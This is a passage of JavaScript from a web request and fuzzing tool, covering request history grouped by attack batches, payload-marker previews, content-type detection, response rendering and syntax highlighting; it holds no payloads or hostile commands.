        const sizeLabel = formatBytes(bodySize);
        const relTime = formatRelativeTime(item.timestamp);
        const exactTime = formatExactTime(item.timestamp);
        const wasRedirected = item.response.finalUrl && item.response.finalUrl !== item.url;
        const redirectBadge = wasRedirected
          ? `<span class="redirect-badge" data-final-url="${escapeHtml(item.response.finalUrl)}" title="Redirected to:\n${escapeHtml(item.response.finalUrl)}\nClick to load Final URL">↳ REDIR</span>`
          : '';

        let sizeClass = '';
        if (anomalyIds.has(item.id)) sizeClass = 'size-anomaly';
        else if (bodySize === maxSize && maxSize !== minSize) sizeClass = 'size-max';
        else if (bodySize === minSize && maxSize !== minSize) sizeClass = 'size-min';

        const noteVal = escapeHtml(item.note || '');
        const isDetailOpen = state.openDetailId === item.id;
        const batchLabel = item.batchName || (item.batchId && state.attackSources[item.batchId]?.name) || '';
        const batchTag = batchLabel
          ? `<span class="batch-tag" title="Attack: ${escapeHtml(batchLabel)}">⚡ ${escapeHtml(batchLabel)}</span>`
          : '';
        const setCookies = getSetCookiesFromHeaders(item.response && item.response.headers);
        const cookieBadge = setCookies.length
          ? `<span class="cookie-badge" title="Set-Cookie (${setCookies.length}): ${escapeHtml(setCookies.map(c => c.name).join(', '))}&#10;Click → Headers & import"></span>`
          : '';

        el.innerHTML = `
          <div class="history-item-top">
            <span class="history-method">${item.method}</span>
            <span class="history-name" data-id="${item.id}" title="Double-click to rename&#10;${escapeHtml(item.url)}">${escapeHtml(displayName)}</span>
            ${batchTag}
            ${cookieBadge}
            ${redirectBadge}
            <span class="status-badge ${statusClass}">${statusLabel}</span>
          </div>
          <div class="history-snippet" title="${escapeHtml(item.url)}">${escapeHtml(snippet)}</div>
          <div class="history-meta">
            <span class="history-time">
              <span title="Response time">${item.response.timeMs} ms</span>
              <span class="hist-sep">·</span>
              <span class="${sizeClass}" title="Body size${sizeClass === 'size-anomaly' ? ' — ANOMALY jump' : sizeClass === 'size-max' ? ' — largest in filter' : sizeClass === 'size-min' ? ' — smallest in filter' : ''}">${sizeLabel}</span>
              <span class="hist-sep">·</span>
              <span title="${escapeHtml(exactTime)}">${relTime}</span>
            </span>
            <div class="history-actions">
              <button class="hist-btn pin-btn ${item.pinned ? 'pinned' : ''}" data-id="${item.id}" title="${item.pinned ? 'Unpin' : 'Pin'}">
                ${item.pinned ? '★' : '☆'}
              </button>
              <button class="hist-btn del-btn" data-id="${item.id}" title="Delete">✕</button>
            </div>
          </div>
          <div class="history-detail">
            <textarea class="hist-note" data-id="${item.id}" placeholder="Note for this request…" spellcheck="false">${noteVal}</textarea>
            <div class="history-detail-actions">
              <button class="btn btn-sm hist-dl-url" data-id="${item.id}" title="Copy full URL">Copy URL</button>
              <button class="btn btn-sm hist-dl-file" data-id="${item.id}" title="Download request info as .txt">Download</button>
              <span class="note-hint">auto-saved</span>
            </div>
          </div>`;

        if (isDetailOpen) el.classList.add('detail-open');

        // Click to load + open detail (ignore if clicking buttons, redirect badge, detail, or editing name)
        el.addEventListener('click', (e) => {
          if (e.target.closest('.hist-btn') || e.target.closest('.redirect-badge') ||
              e.target.closest('.history-detail') || e.target.classList.contains('history-name')) return;
          state.openDetailId = item.id;
          loadHistoryItem(item.id);
          // Expand response if minimized
          if (typeof setResponseCollapsed === 'function') setResponseCollapsed(false);
          renderHistory();
        });

        // Drag & Drop
        el.addEventListener('dragstart', (e) => {
          state.dragId = item.id;
          el.classList.add('dragging');
          e.dataTransfer.effectAllowed = 'move';
        });
        el.addEventListener('dragend', () => {
          el.classList.remove('dragging');
          state.dragId = null;
          $$('.history-item').forEach(i => i.classList.remove('drag-over'));
        });
        el.addEventListener('dragover', (e) => {
          e.preventDefault();
          e.dataTransfer.dropEffect = 'move';
          $$('.history-item').forEach(i => i.classList.remove('drag-over'));
          el.classList.add('drag-over');
        });
        el.addEventListener('dragleave', () => el.classList.remove('drag-over'));
        el.addEventListener('drop', (e) => {
          e.preventDefault();
          el.classList.remove('drag-over');
          if (state.dragId == null || state.dragId === item.id) return;
          reorderHistory(state.dragId, item.id);
        });

        return el;
      };

      // Group by attack when viewing Attacks filter
      const useBatchGroups = (state.hfActive === 'batch' || (state.selectedBatchIds || []).length > 0)
        && sorted.some(it => it.batchId);

      if (useBatchGroups) {
        const groups = {};
        const noBatch = [];
        sorted.forEach(it => {
          if (it.batchId) {
            if (!groups[it.batchId]) groups[it.batchId] = [];
            groups[it.batchId].push(it);
          } else {
            noBatch.push(it);
          }
        });
        Object.entries(groups).forEach(([bid, items]) => {
          const name = items[0].batchName
            || state.attackSources[bid]?.name
            || bid;
          const collapsed = !!(state.collapsedBatches && state.collapsedBatches[bid]);
          const group = document.createElement('div');
          group.className = 'hist-batch-group' + (collapsed ? ' collapsed' : '');
          group.dataset.batchId = bid;
          group.innerHTML = `
            <div class="hist-batch-group-header" data-batch-toggle="${escapeHtml(bid)}">
              <span class="g-chevron">▼</span>
              <span>⚡ ${escapeHtml(name)}</span>
              <span class="g-count">${items.length} req</span>
            </div>
            <div class="hist-batch-group-body"></div>
          `;
          const body = group.querySelector('.hist-batch-group-body');
          items.forEach(it => body.appendChild(buildHistoryItemEl(it)));
          historyList.appendChild(group);
        });
        noBatch.forEach(it => historyList.appendChild(buildHistoryItemEl(it)));
        historyList.querySelectorAll('[data-batch-toggle]').forEach(hdr => {
          hdr.addEventListener('click', () => {
            const bid = hdr.dataset.batchToggle;
            if (!state.collapsedBatches) state.collapsedBatches = {};
            state.collapsedBatches[bid] = !state.collapsedBatches[bid];
            renderHistory();
          });
        });
      } else {
        sorted.forEach((item) => historyList.appendChild(buildHistoryItemEl(item)));
      }

      // Pin buttons
      historyList.querySelectorAll('.pin-btn').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          const item = state.history.find(h => h.id === id);
          if (item) {
            item.pinned = !item.pinned;
            renderHistory();
            showToast(item.pinned ? 'Pinned' : 'Unpinned');
          }
        });
      });

      // Redirect badge → load Final URL
      historyList.querySelectorAll('.redirect-badge').forEach((badge) => {
        badge.addEventListener('click', (e) => {
          e.stopPropagation();
          const finalUrl = badge.dataset.finalUrl;
          if (!finalUrl) return;
          urlInput.value = finalUrl;
          methodSelect.value = 'GET';
          showToast('Loading Final URL…');
          sendRequest();
        });
      });

      // Neon cookie badge → close history, Headers tab + open import panel
      historyList.querySelectorAll('.cookie-badge').forEach((badge) => {
        badge.addEventListener('click', (e) => {
          e.stopPropagation();
          const itemEl = badge.closest('.history-item');
          const id = itemEl ? +itemEl.dataset.id : null;
          if (id != null && typeof loadHistoryItem === 'function') loadHistoryItem(id);
          $$('.tab-btn').forEach((b) => b.classList.toggle('active', b.dataset.tab === 'headers'));
          $$('.tab-content').forEach((c) => c.classList.toggle('active', c.id === 'tab-headers'));
          // Collapse history drawer so response Headers is visible
          if (typeof closeVPanel === 'function') closeVPanel('history');
          requestAnimationFrame(() => {
            openCookieImportPanel();
            showToast('Select cookies to import');
          });
        });
      });

      // Delete buttons
      historyList.querySelectorAll('.del-btn').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          deleteHistoryItem(id);
        });
      });

      // Rename (double-click)
      historyList.querySelectorAll('.history-name').forEach((nameEl) => {
        nameEl.addEventListener('dblclick', (e) => {
          e.stopPropagation();
          nameEl.contentEditable = 'true';
          nameEl.focus();
          const range = document.createRange();
          range.selectNodeContents(nameEl);
          const sel = window.getSelection();
          sel.removeAllRanges();
          sel.addRange(range);
        });
        nameEl.addEventListener('blur', () => {
          nameEl.contentEditable = 'false';
          const id = +nameEl.dataset.id;
          const item = state.history.find(h => h.id === id);
          if (item) {
            const newName = nameEl.textContent.trim();
            item.name = newName || null;
            renderHistory();
          }
        });
        nameEl.addEventListener('keydown', (e) => {
          if (e.key === 'Enter') {
            e.preventDefault();
            nameEl.blur();
          }
          if (e.key === 'Escape') {
            nameEl.contentEditable = 'false';
            renderHistory();
          }
        });
      });

      // Notes — auto-save on input
      historyList.querySelectorAll('.hist-note').forEach((ta) => {
        ta.addEventListener('click', (e) => e.stopPropagation());
        ta.addEventListener('input', () => {
          const id = +ta.dataset.id;
          const item = state.history.find(h => h.id === id);
          if (item) item.note = ta.value;
        });
      });

      // Copy URL
      historyList.querySelectorAll('.hist-dl-url').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          const item = state.history.find(h => h.id === id);
          if (!item) return;
          navigator.clipboard.writeText(item.url).then(() => showToast('URL copied', 'success'))
            .catch(() => showToast('Copy failed'));
        });
      });

      // Download request as .txt
      historyList.querySelectorAll('.hist-dl-file').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          const id = +btn.dataset.id;
          const item = state.history.find(h => h.id === id);
          if (!item) return;
          const text = [
            `ID: ${item.id}`,
            `Method: ${item.method}`,
            `URL: ${item.url}`,
            `Status: ${item.response.status} ${item.response.statusText || ''}`,
            `Time: ${item.response.timeMs} ms`,
            `Payload: ${item.payload || ''}`,
            `Batch: ${item.batchName || item.batchId || '-'}`,
            `Note: ${item.note || ''}`,
            `--- Response body ---`,
            item.response.body || '',
          ].join('\n');
          const blob = new Blob([text], { type: 'text/plain' });
          const a = document.createElement('a');
          a.href = URL.createObjectURL(blob);
          a.download = `request-${item.id}.txt`;
          a.click();
          URL.revokeObjectURL(a.href);
          showToast('Downloaded', 'success');
        });
      });
    }

    function reorderHistory(fromId, toId) {
      const fromIdx = state.history.findIndex(h => h.id === fromId);
      const toIdx = state.history.findIndex(h => h.id === toId);
      if (fromIdx < 0 || toIdx < 0) return;
      const [moved] = state.history.splice(fromIdx, 1);
      state.history.splice(toIdx, 0, moved);
      renderHistory();
    }

    function deleteHistoryItem(id) {
      state.history = state.history.filter(h => h.id !== id);
      if (state.activeHistoryId === id) {
        state.activeHistoryId = null;
        clearResponseView();
      }
      renderHistory();
      showToast('Deleted');
    }

    function loadHistoryItem(id) {
      const item = state.history.find(h => h.id === id);
      if (!item) return;
      state.activeHistoryId = id;
      state.openDetailId = id;
      methodSelect.value = item.method;
      urlInput.value = item.url;
      // Don't wipe workbench batch template — only show this payload if not a batch source
      // User can use Restore Attack Source for full template
      if (postBodyInput) postBodyInput.value = item.postBody || '';
      updateBodyVisibility();
      // Expand response panel if it was minimized
      if (typeof setResponseCollapsed === 'function') setResponseCollapsed(false);
      displayResponse(item.response, item.url);
      renderHistory();
    }

    clearHistoryBtn.addEventListener('click', () => {
      if (state.history.length === 0) return;
      const before = state.history.length;
      state.history = state.history.filter(h => h.pinned);
      const removed = before - state.history.length;
      if (state.activeHistoryId && !state.history.find(h => h.id === state.activeHistoryId)) {
        state.activeHistoryId = null;
        clearResponseView();
      }
      renderHistory();
      showToast(removed ? `Cleared ${removed} unpinned item(s)` : 'Nothing to clear (all pinned)');
    });

    // History search + status filter
    const historySearchInput = $('#historySearch');
    const historyStatusFilter = $('#historyStatusFilter');
    if (historySearchInput) {
      historySearchInput.addEventListener('input', () => {
        state.historySearch = historySearchInput.value;
        renderHistory();
      });
    }
    if (historyStatusFilter) {
      historyStatusFilter.addEventListener('change', () => {
        state.historyStatusFilter = historyStatusFilter.value;
        renderHistory();
      });
    }

    // Sort buttons — click same key toggles direction
    const SORT_LABELS = {
      time: 'Time', order: 'Order', status: 'Status',
      size: 'Size', rtt: 'RTT', redir: 'Redirect',
    };
    $$('.sort-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const key = btn.dataset.key;
        const cur = state.historySort || { key: 'time', dir: 'desc' };
        let dir = btn.dataset.dir || 'desc';
        if (cur.key === key) {
          dir = cur.dir === 'asc' ? 'desc' : 'asc';
        }
        state.historySort = { key, dir };
        $$('.sort-btn').forEach(b => {
          b.classList.remove('active');
          const k = b.dataset.key;
          const arrow = (state.historySort.key === k)
            ? (state.historySort.dir === 'asc' ? ' ↑' : ' ↓')
            : (b.dataset.dir === 'asc' ? ' ↑' : ' ↓');
          if (k === 'redir') {
            b.textContent = 'Redirect';
          } else {
            b.textContent = (SORT_LABELS[k] || k) + (state.historySort.key === k ? arrow : '');
          }
          b.dataset.dir = (state.historySort.key === k) ? state.historySort.dir : (b.dataset.dir || 'desc');
        });
        btn.classList.add('active');
        renderHistory();
      });
    });

    // Restore attack source settings
    const restoreAttackBtn = $('#restoreAttackBtn');
    if (restoreAttackBtn) {
      restoreAttackBtn.addEventListener('click', () => {
        const bar = $('#attackSourceBar');
        const bid = bar && bar.dataset.batchId;
        const src = bid && state.attackSources[bid];
        if (!src) {
          showToast('No source saved for this attack');
          return;
        }
        urlInput.value = src.urlTemplate || '';
        payloadInput.value = src.payloadText || '';
        methodSelect.value = src.method || 'GET';
        if (postBodyInput) postBodyInput.value = src.postBody || '';
        if (src.headers) {
          state.headers = src.headers.map(h => ({ ...h }));
          renderHeaders();
        }
        if (src.atkConfig) {
          if ($('#atkThreads')) $('#atkThreads').value = src.atkConfig.threads;
          if ($('#atkDelay')) $('#atkDelay').value = src.atkConfig.delay;
          if ($('#atkTimeout')) $('#atkTimeout').value = src.atkConfig.timeout;
          if ($('#atkStopOn')) $('#atkStopOn').value = src.atkConfig.stopOn;
        }
        if (typeof updateBodyVisibility === 'function') updateBodyVisibility();
        if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
        showToast('Attack source restored: ' + (src.name || ''), 'success');
      });
    }

    // URL hover preview — show resolved URL after $1/$2 substitution
    const urlPreviewTip = $('#urlPreviewTip');
    const urlPreviewText = $('#urlPreviewText');
    function updateUrlPreview() {
      if (!urlPreviewText) return;
      const raw = urlInput.value.trim();
      let resolved = raw;
      try {
        if (typeof detectAttackMode === 'function' && typeof applySinglePayload === 'function') {
          const { payloads } = detectAttackMode();
          if (payloads.length > 0 && raw.includes('$')) {
            resolved = applySinglePayload(raw, payloads[0].text);
            if (payloads.length > 1) {
              resolved += `   (+${payloads.length - 1} more in batch)`;
            }
          } else if (typeof applyPayloadPlaceholders === 'function') {
            resolved = applyPayloadPlaceholders(raw);
          }
        } else if (typeof applyPayloadPlaceholders === 'function') {
          resolved = applyPayloadPlaceholders(raw);
        }
      } catch (_) { resolved = raw; }
      urlPreviewText.textContent = resolved || '(empty)';
      if (resolved !== raw && raw.includes('$')) {
        urlPreviewTip.style.borderColor = 'var(--success)';
        urlPreviewText.style.color = 'var(--success)';
      } else {
        urlPreviewTip.style.borderColor = 'var(--accent-cyan)';
        urlPreviewText.style.color = 'var(--accent-cyan)';
      }
    }
    if (urlInput && urlPreviewTip) {
      // Only when mouse is directly over the URL input (not the wrapper/card)
      urlInput.addEventListener('mouseenter', () => {
        updateUrlPreview();
        urlPreviewTip.classList.add('show');
      });
      urlInput.addEventListener('mouseleave', () => {
        urlPreviewTip.classList.remove('show');
      });
      urlInput.addEventListener('input', () => {
        if (urlPreviewTip.classList.contains('show')) updateUrlPreview();
      });
      if (payloadInput) {
        payloadInput.addEventListener('input', () => {
          if (urlPreviewTip.classList.contains('show')) updateUrlPreview();
          if (bodyPreviewTip && bodyPreviewTip.classList.contains('show')) updateBodyPreview();
        });
      }
    }

    // ===== Body Content-Type detection =====
    function detectBodyContentType(body) {
      const s = String(body || '').trim();
      if (!s) return { mime: '', label: 'empty', kind: 'empty' };
      // JSON
      if ((s.startsWith('{') && s.endsWith('}')) || (s.startsWith('[') && s.endsWith(']'))) {
        try {
          JSON.parse(s);
          return { mime: 'application/json', label: 'JSON', kind: 'json' };
        } catch { /* fallthrough */ }
      }
      // XML
      if (s.startsWith('<?xml') || /^<[a-zA-Z_][\w:.-]*[\s>]/.test(s)) {
        return { mime: 'application/xml', label: 'XML', kind: 'xml' };
      }
      // multipart
      if (/^------WebKitFormBoundary|^--[A-Za-z0-9_-]+/m.test(s) && /Content-Disposition:/i.test(s)) {
        return { mime: 'multipart/form-data', label: 'multipart', kind: 'multipart' };
      }
      // form urlencoded: key=value pairs joined by &
      if (/^[^=&\s]+=/.test(s) && s.includes('=') && !s.includes('{') && !s.includes('<')) {
        const pairs = s.split('&').filter(Boolean);
        if (pairs.length >= 1 && pairs.every((p) => /^[^=]+=/.test(p) || p.includes('='))) {
          return { mime: 'application/x-www-form-urlencoded', label: 'form', kind: 'form' };
        }
      }
      return { mime: 'text/plain', label: 'text', kind: 'text' };
    }

    function getConfiguredContentType() {
      const h = state.headers.find((x) => (x.key || '').toLowerCase() === 'content-type');
      return h && h.value.trim() ? h.value.trim() : '';
    }

    // Body CT mode: 'auto' | mime string | 'custom'
    let bodyCtMode = 'auto';

    function getBodyCtChoice() {
      if (bodyCtMode === 'custom') {
        return ($('#bodyCtCustom')?.value || '').trim() || 'text/plain';
      }
      if (bodyCtMode === 'auto') {
        const body = postBodyInput ? postBodyInput.value : '';
        return detectBodyContentType(body).mime;
      }
      return bodyCtMode;
    }

    function updateBodyCtUI() {
      const wrap = $('#bodyCtWrap');
      const badge = $('#bodyCtBadge');
      const menu = $('#bodyCtMenu');
      const custom = $('#bodyCtCustom');
      if (!badge || !wrap) return;
      const body = postBodyInput ? postBodyInput.value : '';
      const det = detectBodyContentType(body);
      const configured = getConfiguredContentType();

      // Hide entire CT UI when body is empty
      if (!det.mime) {
        wrap.classList.add('hidden');
        if (menu) menu.classList.add('hidden');
        return;
      }
      wrap.classList.remove('hidden');
      if (custom) custom.classList.toggle('hidden', bodyCtMode !== 'custom');

      badge.className = 'body-ct-badge';
      let cls = 'ct-' + det.kind;
      let text = det.label;
      if (bodyCtMode === 'auto' && configured && configured.toLowerCase() !== det.mime.toLowerCase()) {
        cls = 'ct-conflict';
        text = det.label + ' ≠ hdr';
        badge.title = `Detected: ${det.mime}\nSettings Content-Type: ${configured}\nClick to override type`;
      } else if (bodyCtMode !== 'auto') {
        const chosen = bodyCtMode === 'custom' ? (custom?.value || 'custom') : bodyCtMode;
        text = String(chosen).split('/').pop() || chosen;
        badge.title = `Will send: ${chosen}\nDetected: ${det.mime}\nClick to change`;
        if (String(chosen).toLowerCase().includes('json')) cls = 'ct-json';
        else if (String(chosen).includes('form')) cls = 'ct-form';
        else if (String(chosen).includes('xml')) cls = 'ct-xml';
      } else {
        badge.title = `Detected: ${det.mime}` + (configured ? `\nSettings: ${configured}` : '\nWill auto-set Content-Type') + '\nClick to change';
      }
      badge.classList.add(cls);
      badge.textContent = text;

      if (menu) {
        menu.querySelectorAll('button[data-ct]').forEach((b) => {
          b.classList.toggle('active', b.dataset.ct === bodyCtMode);
        });
      }
    }

    /**
     * Build final headers for a request with body Content-Type rules:
     * - Auto + no Settings CT → set detected
     * - Auto + Settings CT → keep Settings (no override)
     * - Manual body CT → override / set Content-Type for this request
     */
    function buildRequestHeaders(postBody) {
      const headers = {};
      state.headers.forEach((h) => {
        if (h.key.trim()) headers[h.key.trim()] = h.value;
      });
      const hasBody = String(postBody || '').length > 0;
      if (!hasBody) return headers;

      const mode = bodyCtMode || 'auto';
      const ctKey = Object.keys(headers).find((k) => k.toLowerCase() === 'content-type');
      const configured = ctKey ? headers[ctKey] : '';

      if (mode === 'auto') {
        if (!configured || !String(configured).trim()) {
          const det = detectBodyContentType(postBody);
          if (det.mime) headers[ctKey || 'Content-Type'] = det.mime;
        }
      } else {
        let chosen = mode;
        if (mode === 'custom') chosen = ($('#bodyCtCustom')?.value || '').trim() || 'text/plain';
        if (ctKey) headers[ctKey] = chosen;
        else headers['Content-Type'] = chosen;
      }
      return headers;
    }

    // Wire body CT controls (badge menu — no separate select)
    (function bindBodyCtUI() {
      const badge = $('#bodyCtBadge');
      const menu = $('#bodyCtMenu');
      const custom = $('#bodyCtCustom');
      if (badge && menu) {
        badge.addEventListener('click', (e) => {
          e.stopPropagation();
          menu.classList.toggle('hidden');
        });
        menu.querySelectorAll('button[data-ct]').forEach((btn) => {
          btn.addEventListener('click', (e) => {
            e.stopPropagation();
            bodyCtMode = btn.dataset.ct || 'auto';
            menu.classList.add('hidden');
            updateBodyCtUI();
            if (bodyCtMode === 'custom' && custom) {
              custom.classList.remove('hidden');
              custom.focus();
            }
          });
        });
        document.addEventListener('click', () => menu.classList.add('hidden'));
      }
      if (custom) custom.addEventListener('input', updateBodyCtUI);
      if (postBodyInput) postBodyInput.addEventListener('input', updateBodyCtUI);
      setTimeout(updateBodyCtUI, 0);
    })();

    // Body hover preview — show resolved body after $1/$2 substitution
    const bodyPreviewTip = $('#bodyPreviewTip');
    const bodyPreviewText = $('#bodyPreviewText');
    function updateBodyPreview() {
      if (!bodyPreviewText || !postBodyInput) return;
      const raw = postBodyInput.value;
      let resolved = raw;
      try {
        if (typeof detectAttackMode === 'function' && typeof applySinglePayload === 'function') {
          const { payloads } = detectAttackMode();
          if (payloads.length > 0 && raw.includes('$')) {
            resolved = applySinglePayload(raw, payloads[0].text);
            if (payloads.length > 1) {
              resolved += `\n\n(+${payloads.length - 1} more in batch)`;
            }
          } else if (typeof applyPayloadPlaceholders === 'function') {
            resolved = applyPayloadPlaceholders(raw);
          }
        } else if (typeof applyPayloadPlaceholders === 'function') {
          resolved = applyPayloadPlaceholders(raw);
        }
      } catch (_) { resolved = raw; }
      bodyPreviewText.textContent = resolved || '(empty body)';
      if (resolved !== raw && raw.includes('$')) {
        bodyPreviewTip.style.borderColor = 'var(--success)';
        bodyPreviewText.style.color = 'var(--success)';
      } else {
        bodyPreviewTip.style.borderColor = 'var(--accent-cyan)';
        bodyPreviewText.style.color = 'var(--accent-cyan)';
      }
    }
    if (postBodyInput && bodyPreviewTip) {
      postBodyInput.addEventListener('mouseenter', () => {
        updateBodyPreview();
        bodyPreviewTip.classList.add('show');
      });
      postBodyInput.addEventListener('mouseleave', () => {
        bodyPreviewTip.classList.remove('show');
      });
      postBodyInput.addEventListener('input', () => {
        if (bodyPreviewTip.classList.contains('show')) updateBodyPreview();
      });
    }

    // Insert $1 marker at cursor inside Request Body
    const insertMarkerBodyBtn = $('#insertMarkerBodyBtn');
    if (insertMarkerBodyBtn && postBodyInput) {
      insertMarkerBodyBtn.addEventListener('click', () => {
        const ta = postBodyInput;
        const start = ta.selectionStart;
        const end = ta.selectionEnd;
        const before = ta.value.substring(0, start);
        const after = ta.value.substring(end);
        ta.value = before + '$1' + after;
        const pos = start + 2;
        ta.setSelectionRange(pos, pos);
        ta.focus();
        showToast('$1 marker inserted — hover body to preview', 'success');
      });
    }

    // ===== Response Display =====
    function clearResponseView() {
      renderedPlaceholder.classList.remove('hidden');
      renderedFrame.classList.add('hidden');
      renderedFrame.srcdoc = '';
      state.lastRenderedHtml = '';
      rawResponse.innerHTML = 'No response data.';
      metaTableWrap.innerHTML = '<div class="meta-empty">No metadata available.</div>';
      $('#sbStatus').textContent = '—';
      $('#sbTime').textContent = '—';
      $('#sbSize').textContent = '—';
      $('#sbType').textContent = '—';
      $('#sbStatus').className = '';
    }

    function displayResponse(resp, targetUrl) {
      const sbStatus = $('#sbStatus');
      sbStatus.textContent = `${resp.status} ${resp.statusText}`;
      sbStatus.className = resp.status >= 500 ? 'status-err'
        : resp.status >= 400 ? 'status-warn'
        : resp.status > 0 ? 'status-ok' : 'status-err';
      $('#sbTime').textContent = `${resp.timeMs} ms`;
      const bodyLen = (resp.body || '').length;
      $('#sbSize').textContent = `${bodyLen} B`;
      $('#sbType').textContent = (resp.headers && (resp.headers['Content-Type'] || resp.headers['content-type'])) || '—';

      // Syntax-highlighted raw body
      const rawBody = resp.body || '';
      const ct = (resp.headers && (resp.headers['Content-Type'] || resp.headers['content-type'])) || '';
      rawResponse.innerHTML = highlightCode(rawBody, ct);

      const legend = `<div class="meta-legend">
        <span><i style="background:#ff6b6b"></i> Security</span>
        <span><i style="background:#ffd93d"></i> Auth / Cookie</span>
        <span><i style="background:#6bcB77"></i> Cache</span>
        <span><i style="background:#4dabf7"></i> Content</span>
        <span><i style="background:#b197fc"></i> Server</span>
        <span><i style="background:#ff922b"></i> CORS</span>
      </div>`;
      let tableHtml = legend + `<table class="meta-table">
        <tr><th>Status Code</th><td><span class="meta-val-num">${resp.status}</span> ${escapeHtml(resp.statusText || '')}</td></tr>
        <tr><th>Response Time</th><td><span class="meta-val-num">${resp.timeMs}</span> ms</td></tr>
        <tr><th>Body Size</th><td><span class="meta-val-num">${bodyLen}</span> bytes</td></tr>`;
      if (resp.finalUrl && resp.finalUrl !== targetUrl) {
        tableHtml += `<tr class="meta-cat-content"><th><span class="meta-key">Final URL</span><span class="meta-badge content">Redirect</span></th><td><span class="meta-val-url">${escapeHtml(resp.finalUrl)}</span></td></tr>`;
      }
      if (resp.headers) {
        tableHtml += highlightHeadersTable(resp.headers);
      }
      tableHtml += '</table>';
      // Cookie import UI when Set-Cookie present
      tableHtml += renderCookieImportPanel(resp.headers);
      metaTableWrap.innerHTML = tableHtml;
      bindCookieImportPanel();

      // Prefer backend's fixed_html (already has <base> injected), otherwise do it client-side
      let htmlToRender = resp.fixedHtml || resp.body || '';

      if (!resp.fixedHtml && htmlToRender) {
        let baseHref = targetUrl || 'https://example.com/';
        try {
          const u = new URL(targetUrl);
          baseHref = u.origin + u.pathname.replace(/\/[^/]*$/, '/');
        } catch {}
        htmlToRender = /<head[^>]*>/i.test(htmlToRender)
          ? htmlToRender.replace(/<head[^>]*>/i, (m) => `${m}\n<base href="${baseHref}">`)
          : `<base href="${baseHref}">\n${htmlToRender}`;
      }

      // Light JS-friendly cleanup so basic site UI scripts can run in the preview iframe
      htmlToRender = prepareHtmlForRender(htmlToRender);

      // Night Protect — soft CSS and/or strict smart dimming
      if (state.nightProtectMode > 0) {
        htmlToRender = applyNightProtect(htmlToRender, state.nightProtectMode);
      }

      // Inject interaction bridge so links/forms work through our proxy
      htmlToRender = injectInteractionBridge(htmlToRender, targetUrl);

      renderedPlaceholder.classList.add('hidden');
      renderedFrame.classList.remove('hidden');
      // Store for Expand modal (always latest)
      state.lastRenderedHtml = htmlToRender;

      // Clear then set (next frame) so browser always repaints after navigation
      renderedFrame.removeAttribute('srcdoc');
      requestAnimationFrame(() => {
        renderedFrame.srcdoc = htmlToRender;
      });

      // If expand modal is open on rendered tab, refresh it too
      if (modalOverlay.classList.contains('open') && activeTab === 'rendered') {
        openModal();
      }
    }

    /** Lightweight syntax highlighter for HTML / JSON / CSS / JS */
    function highlightCode(code, contentType) {
      if (!code) return 'No response data.';
      const ct = (contentType || '').toLowerCase();
      const trimmed = code.trim();

      // JSON
      if (ct.includes('json') || ((trimmed.startsWith('{') || trimmed.startsWith('[')) && (() => { try { JSON.parse(trimmed); return true; } catch { return false; } })())) {
        return highlightJson(code);
      }
      // HTML / XML
      if (ct.includes('html') || ct.includes('xml') || /<\/?[a-zA-Z][\s\S]*>/.test(trimmed.slice(0, 500))) {
        return highlightHtml(code);
      }
      // CSS
      if (ct.includes('css')) {
        return highlightCss(code);
      }
      // JS
      if (ct.includes('javascript') || ct.includes('ecmascript')) {
        return highlightJs(code);
      }
      // Fallback: try HTML-ish
      if (trimmed.includes('<') && trimmed.includes('>')) return highlightHtml(code);
      return escapeHtml(code);
    }

    function highlightHtml(src) {
      let s = escapeHtml(src);
      // Doctype
      s = s.replace(/(&lt;!DOCTYPE[\s\S]*?&gt;)/gi, '<span class="tok-comment">$1</span>');
      // Comments
      s = s.replace(/(&lt;!--[\s\S]*?--&gt;)/g, '<span class="tok-comment">$1</span>');
      // Style / script blocks content
      s = s.replace(/(&lt;style[^&]*&gt;)([\s\S]*?)(&lt;\/style&gt;)/gi, (_, a, body, c) => {
        return a.replace(/(&lt;\/?)([\w:-]+)/g, '<span class="tok-tag">$1</span><span class="tok-name">$2</span>')
          + highlightCss(body.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&amp;/g, '&'))
          + c.replace(/(&lt;\/?)([\w:-]+)/g, '<span class="tok-tag">$1</span><span class="tok-name">$2</span>');
      });
      // Tags + attributes (including short and unquoted values)
      s = s.replace(/(&lt;\/?)([\w:-]+)((?:[^&]|&(?!gt;))*?)(\/?&gt;)/g, (_, open, name, attrs, close) => {
        const coloredAttrs = attrs.replace(
          /([\w:-]+)(?:\s*=\s*(?:(&quot;[\s\S]*?&quot;)|(&#39;[\s\S]*?&#39;)|([^\s&gt;]+)))?/g,
          (m, attr, dq, sq, bare) => {
            if (dq || sq || bare) {
              return `<span class="tok-attr">${attr}</span>=<span class="tok-str">${dq || sq || bare}</span>`;
            }
            return `<span class="tok-attr">${attr}</span>`;
          }
        );
        return `<span class="tok-tag">${open}</span><span class="tok-name">${name}</span>${coloredAttrs}<span class="tok-tag">${close}</span>`;
      });
      return s;
    }

    function highlightJson(src) {
      // Tokenize more carefully so keys/strings/numbers all color
      let out = '';
      let i = 0;
      const s = src;
      while (i < s.length) {
        const ch = s[i];
        if (ch === '"' || ch === "'") {
          const q = ch;
          let j = i + 1;
          while (j < s.length) {
            if (s[j] === '\\') { j += 2; continue; }
            if (s[j] === q) { j++; break; }
            j++;
          }
          const str = escapeHtml(s.slice(i, j));
          // look ahead for key
          let k = j;
          while (k < s.length && /\s/.test(s[k])) k++;
          if (s[k] === ':') {
            out += `<span class="tok-key">${str}</span>`;
          } else {
            out += `<span class="tok-str">${str}</span>`;
          }
          i = j;
          continue;
        }
        if (/[-\d]/.test(ch)) {
          let j = i + 1;
          while (j < s.length && /[\d.eE+-]/.test(s[j])) j++;
          out += `<span class="tok-num">${escapeHtml(s.slice(i, j))}</span>`;
          i = j;
          continue;
        }
        if (/[a-zA-Z_]/.test(ch)) {
          let j = i + 1;
          while (j < s.length && /[\w]/.test(s[j])) j++;
          const word = s.slice(i, j);
          if (word === 'true' || word === 'false') out += `<span class="tok-bool">${word}</span>`;
          else if (word === 'null') out += `<span class="tok-null">null</span>`;
          else out += escapeHtml(word);
          i = j;
          continue;
        }
        if ('{}[],:'.includes(ch)) {
